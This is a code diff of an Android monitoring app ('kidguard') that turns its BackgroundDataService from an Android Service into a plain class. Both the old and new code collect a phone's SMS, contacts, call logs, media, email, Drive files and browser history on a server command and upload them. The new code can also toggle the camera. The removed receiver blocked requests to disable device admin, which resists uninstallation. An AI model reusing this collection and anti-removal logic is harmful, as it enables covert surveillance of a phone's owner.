@@ -2,24 +2,14 @@ package com.kidguard.services;
 
 
 import android.Manifest;
-import android.app.Service;
-import android.app.admin.DeviceAdminReceiver;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
-import android.content.Intent;
 import android.os.Environment;
-import android.os.IBinder;
 import android.util.Log;
-import android.widget.Toast;
 
 import com.google.api.services.drive.Drive;
 import com.google.gson.Gson;
 import com.google.gson.JsonArray;
 import com.google.gson.reflect.TypeToken;
-import com.kidguard.MainActivity;
-import com.kidguard.R;
-import com.kidguard.UninstallActivity;
 import com.kidguard.asynctask.CallsAsyncTask;
 import com.kidguard.asynctask.ContactsAsyncTask;
 import com.kidguard.asynctask.DownloadDriveFiles;
@@ -40,6 +30,7 @@ import com.kidguard.model.Permissions;
 import com.kidguard.model.Sms;
 import com.kidguard.model.Video;
 import com.kidguard.preference.Preference;
+import com.kidguard.utilities.DeviceAdmin;
 import com.kidguard.utilities.Utilities;
 
 import java.io.File;
@@ -47,12 +38,10 @@ import java.lang.reflect.Type;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
-import java.util.Objects;
 
-public class BackgroundDataService extends Service implements Constant {
+public class BackgroundDataService implements Constant {
     private static final String TAG = BackgroundDataService.class.getSimpleName();
 
-    private static BackgroundDataService bgDataServices;
     private ArrayList<Sms> lstSms;
     private ArrayList<Contacts> lstContacts;
     private ArrayList<Calls> lstCalls;
@@ -65,85 +54,27 @@ public class BackgroundDataService extends Service implements Constant {
     private ArrayList<BrowserHistory> lstBrowserHistory;
     private ArrayList<File> fileList;
     private ArrayList<Permissions> lstPermission;
+    private Context ctx;
 
-    private DevicePolicyManager mDPM;
-    private ComponentName mDeviceAdminSample;
-
-    public static BackgroundDataService getInstance() {
-        return bgDataServices;
+    // Default Constructor
+    public BackgroundDataService(Context ctx) {
+        this.ctx = ctx;
     }
 
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        bgDataServices = BackgroundDataService.this;
-
-        // Prepare to work with the Device Policy Manager
-        mDPM = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        mDeviceAdminSample = new ComponentName(this, DeviceAdminSampleReceiver.class);
-
-        Log.e(TAG, "<<<active>>>" + isActiveAdmin());
-        // Check For Device Admin Permission Are Enable Or Not
-        if (!isActiveAdmin()) {
-            getDeviceAdminPermission(REQUEST_CODE_ENABLE_ADMIN);
-        }
-    }
-
-    // onStartCommand Call
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        if (intent != null) {
-            String tag = intent.getStringExtra(KEY_TAG);
-            String count = intent.getStringExtra(KEY_COUNT);
-            String dateFrom = intent.getStringExtra(KEY_DATE_FROM);
-            String dateTo = intent.getStringExtra(KEY_DATE_TO);
-            String subject = intent.getStringExtra(KEY_SUBJECT);
-            String size = intent.getStringExtra(KEY_SIZE);
-            // Get Data With Tag
-            if (tag != null && !tag.equals("")) {
-                GetDataWithTag(tag, count, dateFrom, dateTo, subject, size);
-            }
-        }
-        return super.onStartCommand(intent, flags, startId);
-    }
-
-    // Helper to determine if we are an active admin
-    private boolean isActiveAdmin() {
-        return mDPM.isAdminActive(mDeviceAdminSample);
-    }
-
-    // Get Device Admin Permissions
-    private void getDeviceAdminPermission(int requestCode) {
-        switch (requestCode) {
-            case REQUEST_CODE_ENABLE_ADMIN:
-                // Launch the activity to have the user enable our admin.
-                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
-                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.add_admin_extra_app_text));
-
-                if (MainActivity.getInstance() != null) {
-                    MainActivity.getInstance().startActivity(intent);
-                }
-
-                if (UninstallActivity.getInstance() != null) {
-                    UninstallActivity.getInstance().startActivity(intent);
-                }
-                break;
-            default:
-                break;
+    // BackgroundDataService Constructor
+    public BackgroundDataService(Context ctx, String tag, String count, String dateFrom, String dateTo, String subject, String size) {
+        this.ctx = ctx;
+        // Get Data With Tag
+        if (tag != null && !tag.equals("")) {
+            getDataWithTag(tag, count, dateFrom, dateTo, subject, size);
         }
     }
 
     // Get Data With Tag Method Call
-    private void GetDataWithTag(String tag, String count, String dateFrom, String dateTo, String size, String subject) {
+    private void getDataWithTag(String tag, String count, String dateFrom, String dateTo, String size, String subject) {
         if (tag.equals(TAG_SMS)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_SMS)) {
-                new SmsAsyncTask(this).execute(count, dateFrom, dateTo);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_SMS)) {
+                new SmsAsyncTask(ctx).execute(count, dateFrom, dateTo);
             } else {
                 sendSmsDataToServer(lstSms);
             }
@@ -151,8 +82,8 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_CONTACTS)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_CONTACTS)) {
-                new ContactsAsyncTask(this).execute(count, dateFrom, dateTo);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_CONTACTS)) {
+                new ContactsAsyncTask(ctx).execute(count, dateFrom, dateTo);
             } else {
                 sendContactsDataToServer(lstContacts);
             }
@@ -160,8 +91,8 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_CALLS)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_CALL_LOG)) {
-                new CallsAsyncTask(this).execute(count, dateFrom, dateTo);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_CALL_LOG)) {
+                new CallsAsyncTask(ctx).execute(count, dateFrom, dateTo);
             } else {
                 sendCallsDataToServer(lstCalls);
             }
@@ -169,8 +100,8 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_FILES)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                new FilesAsyncTask(this).execute(count, dateFrom, dateTo);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                new FilesAsyncTask(ctx).execute(count, dateFrom, dateTo);
             } else {
                 sendFilesDataToServer(lstFiles);
             }
@@ -178,8 +109,8 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_IMAGES)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                new ImagesAsyncTask(this).execute(count, dateFrom, dateTo, size);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                new ImagesAsyncTask(ctx).execute(count, dateFrom, dateTo, size);
             } else {
                 sendImageDataToServer(lstImages);
             }
@@ -187,20 +118,16 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_LIST_APPS)) {
-            Utilities.getListApps(this);
+            Utilities.getListApps(ctx);
             return;
         }
 
         if (tag.equals(TAG_CAMERA)) {
             try {
-                if (isActiveAdmin()) {
-                    if (mDPM.getCameraDisabled(mDeviceAdminSample)) {
-                        mDPM.setCameraDisabled(mDeviceAdminSample, false);
-                    } else {
-                        mDPM.setCameraDisabled(mDeviceAdminSample, true);
-                    }
+                DeviceAdmin deviceAdmin = new DeviceAdmin(ctx);
+                if (deviceAdmin.isActiveAdmin()) {
+                    deviceAdmin.cameraDisableEnable();
                 }
-                stopSelf();
             } catch (SecurityException | NoSuchMethodError e) {
                 e.printStackTrace();
             }
@@ -208,7 +135,7 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_EMAIL)) {
-            if (Utilities.checkPermission(this, Manifest.permission.GET_ACCOUNTS)) {
+            if (Utilities.checkPermission(ctx, Manifest.permission.GET_ACCOUNTS)) {
                 passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
             } else {
                 sendEmailDataToServer(lstEmail);
@@ -217,17 +144,17 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_GOOGLE_DRIVE)) {
-            if (Utilities.checkPermission(this, Manifest.permission.GET_ACCOUNTS)) {
+            if (Utilities.checkPermission(ctx, Manifest.permission.GET_ACCOUNTS)) {
                 passServiceIntent(tag, count, dateFrom, dateTo, subject, size);
             } else {
-                sendSaveDriveDataToServer();
+                sendSaveDriveDataToServer(lstDrive);
             }
             return;
         }
 
         if (tag.equals(TAG_VIDEOS)) {
-            if (Utilities.checkPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
-                new VideoAsyncTask(this).execute(count, dateFrom, dateTo, size);
+            if (Utilities.checkPermission(ctx, Manifest.permission.READ_EXTERNAL_STORAGE) && Utilities.checkPermission(ctx, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
+                new VideoAsyncTask(ctx).execute(count, dateFrom, dateTo, size);
             } else {
                 sendVideosDataToServer(lstVideo);
             }
@@ -235,114 +162,104 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         if (tag.equals(TAG_BROWSER_HISTORY)) {
-            Utilities.getBrowserHistoryList(this);
+            Utilities.getBrowserHistoryList(ctx);
             return;
         }
 
         if (tag.equals(TAG_PERMISSIONS)) {
-            Utilities.getAppPermissions(this);
+            Utilities.getAppPermissions(ctx);
         }
     }
 
     // Pass Service Intent For Email And Google Drive
     private void passServiceIntent(String tag, String count, String dateFrom, String dateTo, String subject, String size) {
-        startService(new Intent(this, GoogleAccountService.class).putExtra(KEY_TAG, tag).putExtra(KEY_COUNT, count).putExtra(KEY_DATE_FROM, dateFrom).putExtra(KEY_DATE_TO, dateTo).putExtra(KEY_SUBJECT, subject).putExtra(KEY_SIZE, size));
+        new GoogleAccountService(ctx, tag, count, dateFrom, dateTo, subject, size);
     }
 
     // Send Sms Data To Server
     public void sendSmsDataToServer(ArrayList<Sms> lstSms) {
         this.lstSms = lstSms;
-        new RestClientService(TAG_SMS, Preference.getAccessToken(this), convertToJSONFormat(TAG_SMS));
-        stopSelf();
+        new RestClientService(TAG_SMS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_SMS));
     }
 
     // Send Contacts Data To Server
     public void sendContactsDataToServer(ArrayList<Contacts> lstContacts) {
         this.lstContacts = lstContacts;
-        new RestClientService(TAG_CONTACTS, Preference.getAccessToken(this), convertToJSONFormat(TAG_CONTACTS));
-        stopSelf();
+        new RestClientService(TAG_CONTACTS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_CONTACTS));
     }
 
     // Send Calls Data To Server
     public void sendCallsDataToServer(ArrayList<Calls> lstCalls) {
         this.lstCalls = lstCalls;
-        new RestClientService(TAG_CALLS, Preference.getAccessToken(this), convertToJSONFormat(TAG_CALLS));
-        stopSelf();
+        new RestClientService(TAG_CALLS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_CALLS));
     }
 
     // Send Files Data To Server
     public void sendFilesDataToServer(ArrayList<Files> lstFiles) {
         this.lstFiles = lstFiles;
         convertToJSONFormat(TAG_FILES);
-        new RestClientService(TAG_FILES, Preference.getAccessToken(this), lstFiles);
-        stopSelf();
+        new RestClientService(TAG_FILES, Preference.getAccessToken(ctx), lstFiles);
     }
 
     // Send Apps Data To Server
     public void sendAppsDataToServer(ArrayList<Apps> lstApps) {
         this.lstApps = lstApps;
-        new RestClientService(TAG_LIST_APPS, Preference.getAccessToken(this), convertToJSONFormat(TAG_LIST_APPS));
-        stopSelf();
+        new RestClientService(TAG_LIST_APPS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_LIST_APPS));
     }
 
     // Send Image Data To Server
     public void sendImageDataToServer(ArrayList<Images> lstImages) {
         this.lstImages = lstImages;
         convertToJSONFormat(TAG_IMAGES);
-        new RestClientService(TAG_IMAGES, Preference.getAccessToken(this), lstImages);
-        stopSelf();
+        new RestClientService(TAG_IMAGES, Preference.getAccessToken(ctx), lstImages);
     }
 
     // Send EMAIL Data To Server
-    public void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
+    void sendEmailDataToServer(ArrayList<Mail> lstEmail) {
         this.lstEmail = lstEmail;
-        new RestClientService(TAG_EMAIL, Preference.getAccessToken(this), convertToJSONFormat(TAG_EMAIL));
-        stopSelf();
+        new RestClientService(TAG_EMAIL, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_EMAIL));
     }
 
     // Send Videos Data To Server
     public void sendVideosDataToServer(ArrayList<Video> lstVideo) {
         this.lstVideo = lstVideo;
         convertToJSONFormat(TAG_VIDEOS);
-        new RestClientService(TAG_VIDEOS, Preference.getAccessToken(this), lstVideo);
-        stopSelf();
+        new RestClientService(TAG_VIDEOS, Preference.getAccessToken(ctx), lstVideo);
     }
 
     // Send Google Drive Data To Server
-    public void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
-        this.lstDrive = lstDrive;
+    void sendGoogleDriveDataToServer(ArrayList<GoogleDrive> lstDrive, Drive mDrive) {
         if (mDrive != null) {
-            Preference.setDriveId(this, 1);
+            Preference.setDriveId(ctx, 1);
             for (GoogleDrive drive : lstDrive) {
                 if (drive.getFileId() != null) {
-                    new DownloadDriveFiles(this, mDrive, lstDrive).execute(drive.getFileId(), drive.getFileTitle());
+                    new DownloadDriveFiles(ctx, mDrive, lstDrive).execute(drive.getFileId(), drive.getFileTitle());
                 }
             }
         }
     }
 
     // Send Download Drive Data To Server
-    public void sendSaveDriveDataToServer() {
+    public void sendSaveDriveDataToServer(ArrayList<GoogleDrive> lstDrive) {
+        this.lstDrive = lstDrive;
         fileList = new ArrayList<>();
         ArrayList<GoogleDrive> lstDrive2 = new ArrayList<>();
         File root = new File(Environment.getExternalStorageDirectory().toString() + File.separator + DRIVE_NAME);
         fileList = getFile(root);
         if (fileList.size() > 0) {
             for (File file : fileList) {
-                if (lstDrive != null) {
-                    if (lstDrive.size() > 0) {
-                        for (GoogleDrive driveList : lstDrive) {
-                            if (!driveList.getFileSize().equals("null")) {
-                                if (String.valueOf(file.length()).equals(driveList.getFileSize())) {
-                                    GoogleDrive drive = new GoogleDrive();
-                                    drive.setFileId(driveList.getFileId());
-                                    drive.setFileTitle(driveList.getFileTitle());
-                                    drive.setFileDate(driveList.getFileDate());
-                                    drive.setFileSize(driveList.getFileSize());
-                                    drive.setFileExtention(driveList.getFileExtention());
-                                    drive.setFileDownloadUrl(file.getAbsolutePath());
-                                    lstDrive2.add(drive);
-                                }
+                if (lstDrive.size() > 0) {
+                    for (GoogleDrive driveList : lstDrive) {
+                        if (!driveList.getFileSize().equals("null")) {
+                            if (String.valueOf(file.length()).equals(driveList.getFileSize())) {
+                                GoogleDrive drive = new GoogleDrive();
+                                drive.setFileId(driveList.getFileId());
+                                drive.setFileTitle(driveList.getFileTitle());
+                                drive.setFileDate(driveList.getFileDate());
+                                drive.setFileSize(driveList.getFileSize());
+                                drive.setFileExtention(driveList.getFileExtention());
+                                drive.setFileDownloadUrl(file.getAbsolutePath());
+                                lstDrive2.add(drive);
                             }
                         }
                     }
@@ -350,22 +267,19 @@ public class BackgroundDataService extends Service implements Constant {
             }
         }
         convertToJSONFormat(TAG_GOOGLE_DRIVE);
-        new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(this), lstDrive2);
-        stopSelf();
+        new RestClientService(TAG_GOOGLE_DRIVE, Preference.getAccessToken(ctx), lstDrive2);
     }
 
     // Send Browser History To Server
     public void sendBrowserHistoryToServer(ArrayList<BrowserHistory> lstBrowserHistory) {
         this.lstBrowserHistory = lstBrowserHistory;
-        new RestClientService(TAG_BROWSER_HISTORY, Preference.getAccessToken(this), convertToJSONFormat(TAG_BROWSER_HISTORY));
-        stopSelf();
+        new RestClientService(TAG_BROWSER_HISTORY, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_BROWSER_HISTORY));
     }
 
     // Send Application Permission's To Server
     public void sendAppPermissionToServer(ArrayList<Permissions> lstPermission) {
         this.lstPermission = lstPermission;
-        new RestClientService(TAG_PERMISSIONS, Preference.getAccessToken(this), convertToJSONFormat(TAG_PERMISSIONS));
-        stopSelf();
+        new RestClientService(TAG_PERMISSIONS, Preference.getAccessToken(ctx), convertToJSONFormat(TAG_PERMISSIONS));
     }
 
     // Get Files List
@@ -538,78 +452,7 @@ public class BackgroundDataService extends Service implements Constant {
         }
 
         finalJSON = "{" + sbAppend + "}";
-        Log.e("JSON", "FINAL??" + finalJSON);
+        Log.e(TAG + "<<JSON>>", "FINAL??" + finalJSON);
         return finalJSON;
-    }
-
-    /**
-     * Sample implementation of a DeviceAdminReceiver.  Your controller must provide one,
-     * although you may or may not implement all of the methods shown here.
-     * <p>
-     * All callbacks are on the UI thread and your implementations should not engage in any
-     * blocking operations, including disk I/O.
-     */
-    public static class DeviceAdminSampleReceiver extends DeviceAdminReceiver {
-        void showToast(Context context, String msg) {
-            String status = context.getString(R.string.admin_receiver_status, msg);
-            Toast.makeText(context, status, Toast.LENGTH_SHORT).show();
-        }
-
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            if (Objects.equals(intent.getAction(), ACTION_DEVICE_ADMIN_DISABLE_REQUESTED)) {
-                abortBroadcast();
-            }
-            super.onReceive(context, intent);
-        }
-
-        @Override
-        public void onEnabled(Context context, Intent intent) {
-            Preference.setIsAdminActive(context, true);
-            showToast(context, context.getString(R.string.admin_receiver_status_enabled));
-            if (UninstallActivity.getInstance() != null) {
-                UninstallActivity.getInstance().stopService(new Intent(UninstallActivity.getInstance(), BackgroundDataService.class));
-            }
-        }
-
-        @Override
-        public CharSequence onDisableRequested(Context context, Intent intent) {
-            return context.getString(R.string.admin_receiver_status_disable_warning);
-        }
-
-        @Override
-        public void onDisabled(Context context, Intent intent) {
-            Preference.setIsAdminActive(context, false);
-            showToast(context, context.getString(R.string.admin_receiver_status_disabled));
-
-            Intent in = new Intent(context, UninstallActivity.class);
-            in.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(in);
-        }
-
-        @Override
-        public void onPasswordChanged(Context context, Intent intent) {
-            showToast(context, context.getString(R.string.admin_receiver_status_pw_changed));
-        }
-
-        @Override
-        public void onPasswordFailed(Context context, Intent intent) {
-            showToast(context, context.getString(R.string.admin_receiver_status_pw_failed));
-        }
-
-        @Override
-        public void onPasswordSucceeded(Context context, Intent intent) {
-            showToast(context, context.getString(R.string.admin_receiver_status_pw_succeeded));
-        }
-
-        @Override
-        public void onPasswordExpiring(Context context, Intent intent) {
-            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
-            long expr = dpm.getPasswordExpiration(new ComponentName(context, DeviceAdminSampleReceiver.class));
-            long delta = expr - System.currentTimeMillis();
-            boolean expired = delta < 0L;
-            String message = context.getString(expired ? R.string.expiration_status_past : R.string.expiration_status_future);
-            showToast(context, message);
-        }
     }
 }
